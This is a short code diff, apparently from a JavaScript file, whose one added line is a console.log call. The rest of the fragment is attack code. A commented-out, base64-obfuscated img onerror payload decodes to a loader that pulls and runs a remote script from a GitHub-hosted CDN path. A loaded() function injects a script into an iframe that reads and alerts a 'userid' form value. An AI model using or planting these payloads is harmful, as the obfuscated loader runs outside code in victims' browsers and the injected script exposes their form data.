@@ -53,6 +53,7 @@
 // <img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9MZWFybkhlbHBlci9MZWFybkhlbHBlci9hLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
 
 function loaded() {
+    console.log(document)
     var a=document.getElementById('test3').contentDocument.createElement('script');
     a.textContent="setTimeout(()=>{alert(document.getElementsByName('userid')[0].value)}, 1000)";
     document.getElementById('test3').contentDocument.body.appendChild(a);
